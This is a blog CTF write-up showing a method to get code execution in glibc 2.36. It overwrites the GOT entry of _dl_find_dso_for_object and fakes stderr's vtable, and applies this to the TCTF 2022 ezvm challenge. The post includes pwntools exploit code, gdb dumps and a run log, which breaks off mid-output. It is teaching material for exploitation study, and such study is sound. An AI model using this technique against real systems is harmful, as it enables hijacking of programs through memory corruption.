<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x1] | </title><meta name="keywords" content="Vulnerability,PWN,CTF"><meta name="author" content="KpwnZ"><meta name="copyright" content="KpwnZ"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x1]   Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x1]  invalid vtable TCTF 2022 ezvm Conclusion     In the first part, I sho">
<meta property="og:type" content="article">
<meta property="og:title" content="Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x1]">
<meta property="og:url" content="https://kpwnz.github.io/2022/09/30/Code-Execution-by-Hijacking-IO-FILE-vtable-in-GLIBC-2-36-0x1/index.html">
<meta property="og:site_name">
<meta property="og:description" content="Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x1]   Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x1]  invalid vtable TCTF 2022 ezvm Conclusion     In the first part, I sho">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://source.unsplash.com/featured/?landscape,tech,life">
<meta property="article:published_time" content="2022-09-30T19:44:16.000Z">
<meta property="article:modified_time" content="2022-10-03T09:56:17.790Z">
<meta property="article:author" content="KpwnZ">
<meta property="article:tag" content="Vulnerability">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://source.unsplash.com/featured/?landscape,tech,life"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://kpwnz.github.io/2022/09/30/Code-Execution-by-Hijacking-IO-FILE-vtable-in-GLIBC-2-36-0x1/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Code Execution by Faking IO_FILE->vtable in GLIBC 2.36 [0x1]',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-10-03 02:56:17'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://avatars.githubusercontent.com/u/22996989?s=400&amp;u=470b81ce0dd0fd2e15880f564e1bef0ba9655225&amp;v=4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">19</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://source.unsplash.com/featured/?landscape,tech,life')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/"></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x1]</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-09-30T19:44:16.000Z" title="Created 2022-09-30 12:44:16">2022-09-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-10-03T09:56:17.790Z" title="Updated 2022-10-03 02:56:17">2022-10-03</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x1]"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x1]</h1>
<!-- TOC -->
<ul>
<li><a href="#code-execution-by-faking-io_file-vtable-in-glibc-236-0x1">Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x1]</a>
<ul>
<li><a href="#invalid-vtable">invalid vtable</a></li>
<li><a href="#tctf-2022-ezvm">TCTF 2022 ezvm</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul>
</li>
</ul>
<!-- /TOC -->
<p>In the first part, I showed a new method to completely control the <code>vtable</code> of <code>IO_FILE</code>. In this chapter I would like to present a much more stable way to gain arbitrary code execution and use this way to solve a CTF challenge.</p>
<h2 id="invalid-vtable">invalid <code>vtable</code></h2>
<p>In first chapter we focus on bypassing the checking in <code>_IO_vtable_check</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="keyword">void</span> (*flag) (<span class="keyword">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (!rtld_active ()</span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>When <code>flag != &amp;_IO_IO_vtable_check</code> and <code>rtld_active() != 0</code>, it will finally invoke <code>_dl_addr()</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_dl_addr (<span class="keyword">const</span> <span class="keyword">void</span> *address, Dl_info *info,</span><br><span class="line">	  struct link_map **mapp, <span class="keyword">const</span> ElfW(Sym) **symbolp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Addr)</span> addr </span>= DL_LOOKUP_ADDRESS (address);</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">  __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> _dl_find_dso_for_object (addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (l)</span><br><span class="line">    &#123;</span><br><span class="line">      determine_info (addr, l, info, mapp, symbolp);</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Notice that it will call <code>_dl_find_dso_for_object()</code>. From the assembly code we can find that the address of this function is in <code>ld</code> and it is dynamically resolved which means if we are able to override the <code>.GOT</code> table of it we can jump to anywhere we want! And yes, we don’t need to bruteforce <code>ld</code>’s address with this method.</p>
<h2 id="TCTF-2022-ezvm">TCTF 2022 ezvm</h2>
<p>Here I will demonstrate how to use this arbitrary code execution method to solve this CTF challenge. I will focus on code execution part since there are plenty of writeups with different ways of heap grooming and libc leaking I will only briefly cover these parts.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">b&#x27;Welcome&#x27;</span>, <span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;code size:&#x27;</span>, <span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;memory count&#x27;</span>, tob(<span class="number">0x100</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;code:\n&#x27;</span>, p8(<span class="number">0x17</span>))</span><br></pre></td></tr></table></figure>
<p>with a simple heap grooming we can have a libc address at <code>memory[0]</code>, then we leak the address bit by bit.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">leak = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">64</span>):</span><br><span class="line">    code =  read_mem(<span class="number">0</span>, <span class="number">0</span>)      <span class="comment"># load memory[0] to register[0]</span></span><br><span class="line">    code += push(<span class="number">0</span>)             <span class="comment"># push register[0]</span></span><br><span class="line">    code += read_imm(<span class="number">1</span>, <span class="number">1</span>&lt;&lt;i)   <span class="comment"># load mask to register[0]</span></span><br><span class="line">    code += push(<span class="number">1</span>)             <span class="comment"># push register[0]</span></span><br><span class="line">    code += stk_and             <span class="comment"># logical and stack[top] stack[top-1] and push the result</span></span><br><span class="line">    code += jmp(<span class="number">1</span>)              <span class="comment"># jump to illegal if 1</span></span><br><span class="line">    code += p8(<span class="number">0xff</span>)+p8(<span class="number">0x17</span>)   <span class="comment"># 0xff(illegal) and exit 0x17</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;code size:\n&#x27;</span>, tob(<span class="built_in">len</span>(code)))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;memory count:&#x27;</span>, tob(<span class="number">0x100</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;code:&#x27;</span>, code)</span><br><span class="line">    recv_data = p.recvuntil(<span class="string">b&#x27;finish&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;what&#x27;</span> <span class="keyword">in</span> recv_data:    <span class="comment"># illegal instruction</span></span><br><span class="line">        leak |= (<span class="number">1</span>&lt;&lt;i)</span><br><span class="line">        log.info(<span class="string">&quot;leak data: &quot;</span>+<span class="built_in">hex</span>(leak))</span><br></pre></td></tr></table></figure>
<p>Now we have libc address, so that we are able to calculate one gadget from it. Then using the OOB bug and allocate using <code>mmap</code> by setting a size that is big enough.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># allocate memory with mmap, and exploit the OOB bug</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;code size:&#x27;</span>, <span class="string">b&#x27;500&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;memory count&#x27;</span>, tob(<span class="number">0x6000000000200000</span>)) </span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;writing to stderr&#x27;</span>)</span><br><span class="line">code =  read_imm(<span class="number">0</span>, libc.address+<span class="number">0xebcf8</span>)     <span class="comment"># one_gadget</span></span><br><span class="line">code += store_mem(<span class="number">0</span>, <span class="number">0x24340f</span>*<span class="number">8</span>)              <span class="comment"># offset of GOT</span></span><br><span class="line">code += read_imm(<span class="number">0</span>, <span class="number">0x41414141</span>)               <span class="comment"># vtable, any value not in vtable segment</span></span><br><span class="line">code += store_mem(<span class="number">0</span>, <span class="number">0x121b768</span>)               <span class="comment"># write to stderr-&gt;vtable</span></span><br><span class="line">code += read_imm(<span class="number">0</span>, <span class="number">0x1122334455667788</span>)       <span class="comment"># anything</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0x15</span>):                      <span class="comment"># override fields in stderr</span></span><br><span class="line">    code += store_mem(<span class="number">0</span>, <span class="number">0x121b698</span>+i*<span class="number">8</span>)</span><br><span class="line">code += read_imm(<span class="number">0</span>, <span class="number">0</span>)  </span><br><span class="line">code += store_mem(<span class="number">0</span>, <span class="number">0x121b690</span>)               <span class="comment"># stderr-&gt;flag</span></span><br><span class="line">code += read_imm(<span class="number">0</span>, <span class="number">0xaabbccdd55667788</span>)       <span class="comment"># stderr-&gt;write_ptr</span></span><br><span class="line">code += store_mem(<span class="number">0</span>, <span class="number">0x121b6b8</span>)               <span class="comment"># write to stderr-&gt;write_ptr</span></span><br></pre></td></tr></table></figure>
<p>after that we can notice the <code>vtable</code> is already overrided by <code>AAAA</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/32xg &amp;_IO_2_1_stderr_</span><br><span class="line">0x7fd1d021a6a0 &lt;_IO_2_1_stderr_&gt;:       0x0000000000000000      0x1122334455667788          </span><br><span class="line">0x7fd1d021a6b0 &lt;_IO_2_1_stderr_+16&gt;:    0x1122334455667788      0x1122334455667788          </span><br><span class="line">0x7fd1d021a6c0 &lt;_IO_2_1_stderr_+32&gt;:    0x1122334455667788      0xaabbccdd55667788          </span><br><span class="line">0x7fd1d021a6d0 &lt;_IO_2_1_stderr_+48&gt;:    0x1122334455667788      0x1122334455667788          </span><br><span class="line">0x7fd1d021a6e0 &lt;_IO_2_1_stderr_+64&gt;:    0x1122334455667788      0x1122334455667788</span><br><span class="line">0x7fd1d021a6f0 &lt;_IO_2_1_stderr_+80&gt;:    0x1122334455667788      0x1122334455667788</span><br><span class="line">0x7fd1d021a700 &lt;_IO_2_1_stderr_+96&gt;:    0x1122334455667788      0x1122334455667788</span><br><span class="line">0x7fd1d021a710 &lt;_IO_2_1_stderr_+112&gt;:   0x1122334455667788      0x1122334455667788</span><br><span class="line">0x7fd1d021a720 &lt;_IO_2_1_stderr_+128&gt;:   0x1122334455667788      0x1122334455667788</span><br><span class="line">0x7fd1d021a730 &lt;_IO_2_1_stderr_+144&gt;:   0x1122334455667788      0x1122334455667788</span><br><span class="line">0x7fd1d021a740 &lt;_IO_2_1_stderr_+160&gt;:   0x1122334455667788      0x1122334455667788</span><br><span class="line">0x7fd1d021a750 &lt;_IO_2_1_stderr_+176&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fd1d021a760 &lt;_IO_2_1_stderr_+192&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fd1d021a770 &lt;_IO_2_1_stderr_+208&gt;:   0x0000000000000000      0x0000000041414141  &lt;- any address here</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>and now the <code>.GOT</code> table of <code>_dl_find_dso_for_object</code> is our one gadget</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7f3dbf819088 &lt;_dl_find_dso_for_object@got.plt&gt;:       0x00007f3dbf6ebcf8     0x00007f3dbf7b3430</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/16i 0x00007f3dbf6ebcf8</span><br><span class="line">   0x7f3dbf6ebcf8 &lt;execvpe+1144&gt;:       lea    rdi,[rip+0xec999]        # 0x7f3dbf7d8698                                                                        </span><br><span class="line">   0x7f3dbf6ebcff &lt;execvpe+1151&gt;:       mov    QWORD PTR [rbp-0x78],r9</span><br><span class="line">   0x7f3dbf6ebd03 &lt;execvpe+1155&gt;:       call   0x7f3dbf6eb0f0 &lt;execve&gt;</span><br><span class="line">   0x7f3dbf6ebd08 &lt;execvpe+1160&gt;:       mov    rsp,QWORD PTR [rbp-0x78]</span><br><span class="line">   0x7f3dbf6ebd0c &lt;execvpe+1164&gt;:       mov    eax,DWORD PTR fs:[r14]</span><br><span class="line">   0x7f3dbf6ebd10 &lt;execvpe+1168&gt;:       jmp    0x7f3dbf6ebb82 &lt;execvpe+770&gt;</span><br><span class="line">   0x7f3dbf6ebd15 &lt;execvpe+1173&gt;:       nop    DWORD PTR [rax]</span><br><span class="line">   0x7f3dbf6ebd18 &lt;execvpe+1176&gt;:       mov    BYTE PTR [rbp-0x61],0x1</span><br><span class="line">   0x7f3dbf6ebd1c &lt;execvpe+1180&gt;:       jmp    0x7f3dbf6ebb9d &lt;execvpe+797&gt;</span><br><span class="line">   0x7f3dbf6ebd21 &lt;execvpe+1185&gt;:       mov    DWORD PTR fs:[rcx],0x7</span><br><span class="line">   0x7f3dbf6ebd28 &lt;execvpe+1192&gt;:       mov    rsp,r15</span><br><span class="line">   0x7f3dbf6ebd2b &lt;execvpe+1195&gt;:       jmp    0x7f3dbf6eb8e4 &lt;execvpe+100&gt;</span><br><span class="line">   0x7f3dbf6ebd30 &lt;execvpe+1200&gt;:       lea    rdi,[r10+0x10]</span><br><span class="line">   0x7f3dbf6ebd34 &lt;execvpe+1204&gt;:       lea    rsi,[rbx+0x8]</span><br><span class="line">   0x7f3dbf6ebd38 &lt;execvpe+1208&gt;:       mov    rdx,r11</span><br><span class="line">   0x7f3dbf6ebd3b &lt;execvpe+1211&gt;:       mov    QWORD PTR [rbp-0x80],r9</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure>
<p>Then trigger IO operation by exiting the program.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿bad)-[~/Desktop/ctf/0ctf/ezvm]</span><br><span class="line">└─$ python3 pwnvm3.py</span><br><span class="line">[*] &#x27;/home/kali/Desktop/ctf/0ctf/ezvm/ezvm_p&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] &#x27;/home/kali/Desktop/ctf/0ctf/ezvm/libc-2.35.so&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Starting local process &#x27;/home/kali/Desktop/ctf/0ctf/ezvm/ezvm_p&#x27;: pid 35561</span><br><span class="line">[*] leak data: 0x20</span><br><span class="line">[*] leak data: 0x60</span><br><span class="line">[*] leak data: 0xe0</span><br><span class="line">[*] leak data: 0x4e0</span><br><span class="line">[*] leak data: 0xce0</span><br><span class="line">[*] leak data: 0x1ce0</span><br><span class="line">[*] leak data: 0x9ce0</span><br><span class="line">[*] leak data: 0x19ce0</span><br><span class="line">[*] leak data: 0x819ce0</span><br><span class="line">[*] leak data: 0x1819ce0</span><br><span class="line">[*] leak data: 0x3819ce0</span><br><span class="line">[*] leak data: 0x7819ce0</span><br><span class="line">[*] leak data: 0xf819ce0</span><br><span class="line">[*] leak data: 0x1f819ce0</span><br><span class="line">[*] leak data: 0x3f819ce0</span><br><span class="line">[*] leak data: 0xbf819ce0</span><br><span class="line">[*] leak data: 0x1bf819ce0</span><br><span class="line">[*] leak data: 0x5bf819ce0</span><br><span class="line">[*] leak data: 0xdbf819ce0</span><br><span class="line">[*] leak data: 0x1dbf819ce0</span><br><span class="line">[*] leak data: 0x3dbf819ce0</span><br><span class="line">[*] leak data: 0x13dbf819ce0</span><br><span class="line">[*] leak data: 0x33dbf819ce0</span><br><span class="line">[*] leak data: 0x73dbf819ce0</span><br><span class="line">[*] leak data: 0xf3dbf819ce0</span><br><span class="line">[*] leak data: 0x1f3dbf819ce0</span><br><span class="line">[*] leak data: 